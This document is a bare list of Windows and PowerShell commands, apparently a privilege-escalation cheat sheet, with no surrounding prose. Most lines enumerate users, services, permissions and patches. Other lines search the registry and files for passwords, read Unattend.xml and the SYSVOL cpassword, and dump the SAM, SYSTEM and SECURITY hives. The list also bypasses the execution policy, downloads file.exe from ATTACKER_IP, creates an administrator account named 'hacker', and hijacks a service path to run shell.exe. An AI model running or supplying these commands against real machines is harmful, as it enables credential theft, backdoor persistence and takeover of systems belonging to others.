```
whoami
whoami /priv
whoami /groups
hostname
systeminfo
ipconfig /all
route print
arp -a
netstat -ano
query user
quser
qwinsta
klist
cmdkey /list

$env:USERNAME
$env:USERDOMAIN
$env:COMPUTERNAME
$env:PATH
Get-ChildItem Env:

Get-ComputerInfo
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
Get-LocalGroupMember "Remote Desktop Users"
Get-LocalGroupMember "Remote Management Users"
Get-NetIPConfiguration
Get-NetTCPConnection
Get-Process
Get-Service
Get-ScheduledTask
Get-SmbShare

Get-WmiObject win32_service | Select Name,DisplayName,PathName,StartMode,State
Get-CimInstance Win32_Service | Select Name,DisplayName,PathName,StartMode,State
Get-WmiObject win32_service | Where-Object {$_.StartMode -eq "Auto"} | Select Name,PathName
Get-WmiObject win32_service | Where-Object {$_.PathName -notlike "C:\Windows\*"} | Select Name,PathName
Get-WmiObject win32_service | Where-Object {$_.PathName -and $_.PathName -notmatch '^".*"$' -and $_.PathName -match ' '} | Select Name,PathName

Get-Service | Where-Object {$_.Status -eq "Running"}
Get-Service SERVICE_NAME
Stop-Service SERVICE_NAME
Start-Service SERVICE_NAME
Restart-Service SERVICE_NAME

Get-Acl "C:\Path\To\Service.exe"
Get-Acl "C:\Path\To\Folder"
icacls "C:\Path\To\Service.exe"
icacls "C:\Path\To\Folder"

Get-ItemProperty HKCU:\Software\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKLM:\Software\Policies\Microsoft\Windows\Installer

Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select DefaultUserName,DefaultPassword

Get-ChildItem HKLM:\ -Recurse -ErrorAction SilentlyContinue | ForEach-Object {Get-ItemProperty $_.PsPath -ErrorAction SilentlyContinue} | Select-String "password"
Get-ChildItem HKCU:\ -Recurse -ErrorAction SilentlyContinue | ForEach-Object {Get-ItemProperty $_.PsPath -ErrorAction SilentlyContinue} | Select-String "password"

Get-ChildItem -Path C:\ -Include *password*,*pass*,*cred* -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.xml,*.config -File -Recurse -ErrorAction SilentlyContinue
Select-String -Path C:\*.txt,C:\*.ini,C:\*.xml,C:\*.config -Pattern "password","pass","pwd","username" -ErrorAction SilentlyContinue
Select-String -Path C:\*.config,C:\*.xml -Pattern "connectionString" -ErrorAction SilentlyContinue

Get-Content $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
(Get-PSReadlineOption).HistorySavePath
Get-Content (Get-PSReadlineOption).HistorySavePath

Get-ChildItem C:\ -Force
Get-ChildItem C:\Users -Force
Get-ChildItem C:\Users\$env:USERNAME -Force
Get-ChildItem C:\Users\$env:USERNAME\Desktop -Force
Get-ChildItem C:\Users\$env:USERNAME\Documents -Force

Get-ScheduledTask
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}
Get-ScheduledTask | Select TaskName,TaskPath,State
Get-ScheduledTaskInfo -TaskName TASK_NAME

Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce
Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce

Get-CimInstance Win32_StartupCommand | Select Name,Command,Location,User

Get-HotFix
Get-CimInstance Win32_QuickFixEngineering
Get-CimInstance Win32_Product | Select Name,Version,Vendor

Get-NetFirewallProfile
Get-NetFirewallRule

Get-Process
Get-CimInstance Win32_Process | Select ProcessId,Name,CommandLine

Get-PSDrive
Get-Volume

Get-Acl C:\
Get-Acl C:\Users
Get-Acl C:\ProgramData
Get-Acl "C:\Program Files"
Get-Acl "C:\Program Files (x86)"

Get-ChildItem -Path C:\ -Include *.exe,*.bat,*.ps1,*.vbs -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\ -Include unattend.xml,sysprep.inf,sysprep.xml -File -Recurse -ErrorAction SilentlyContinue
Get-Content C:\Windows\Panther\Unattend.xml
Get-Content C:\Windows\System32\Sysprep\sysprep.inf

Get-ChildItem -Path C:\ -Include Groups.xml,Services.xml,Scheduledtasks.xml,DataSources.xml,Printers.xml -File -Recurse -ErrorAction SilentlyContinue
Select-String -Path "\\DOMAIN\SYSVOL\*.xml" -Pattern "cpassword"

Get-ChildItem -Path C:\inetpub -Include web.config -Recurse -ErrorAction SilentlyContinue
Get-Content C:\inetpub\wwwroot\web.config
Select-String -Path C:\inetpub\wwwroot\web.config -Pattern "password","connectionString"

Get-MpComputerStatus
Get-MpPreference
Get-Service WinDefend

Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System | Select EnableLUA,ConsentPromptBehaviorAdmin

whoami /priv | Select-String "SeImpersonatePrivilege"
whoami /priv | Select-String "SeAssignPrimaryTokenPrivilege"
whoami /priv | Select-String "SeBackupPrivilege"
whoami /priv | Select-String "SeRestorePrivilege"
whoami /priv | Select-String "SeDebugPrivilege"
whoami /priv | Select-String "SeTakeOwnershipPrivilege"

reg save hklm\sam sam.save
reg save hklm\system system.save
reg save hklm\security security.save

vssadmin list shadows
wmic shadowcopy list

Copy-Item C:\Windows\System32\config\SAM .
Copy-Item C:\Windows\System32\config\SYSTEM .
Copy-Item C:\Windows\System32\config\SECURITY .

Test-Path \\127.0.0.1\C$
Get-ChildItem \\127.0.0.1\C$

powershell -ep bypass
powershell -ExecutionPolicy Bypass -File script.ps1
Set-ExecutionPolicy Bypass -Scope Process -Force

Invoke-WebRequest http://ATTACKER_IP/file.exe -OutFile file.exe
iwr http://ATTACKER_IP/file.exe -OutFile file.exe
wget http://ATTACKER_IP/file.exe -OutFile file.exe
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file.exe','file.exe')

Start-Process powershell -Verb runAs
Start-Process cmd -Verb runAs

New-LocalUser hacker -Password (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
Add-LocalGroupMember -Group Administrators -Member hacker
Add-LocalGroupMember -Group "Remote Desktop Users" -Member hacker
Add-LocalGroupMember -Group "Remote Management Users" -Member hacker

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\SERVICE_NAME" -Name ImagePath -Value "C:\Path\shell.exe"
Restart-Service SERVICE_NAME

Get-WmiObject -Class Win32_UserAccount
Get-WmiObject -Class Win32_Group
Get-WmiObject -Class Win32_LoggedOnUser

Get-NetIPAddress
Get-NetRoute
Get-NetNeighbor

Get-SmbConnection
Get-SmbMapping

Get-ChildItem -Path C:\ -Directory -Recurse -ErrorAction SilentlyContinue | Where-Object {($_.GetAccessControl().Access | Where-Object {$_.IdentityReference -match "Everyone|Users|Authenticated Users" -and $_.FileSystemRights -match "Write|Modify|FullControl"})}

Get-ChildItem -Path "C:\Program Files","C:\Program Files (x86)","C:\ProgramData" -Directory -ErrorAction SilentlyContinue | ForEach-Object {Get-Acl $_.FullName}

Get-ExecutionPolicy
Get-ExecutionPolicy -List

Get-Command
Get-Command *password*
Get-Command *credential*

Get-Credential
```
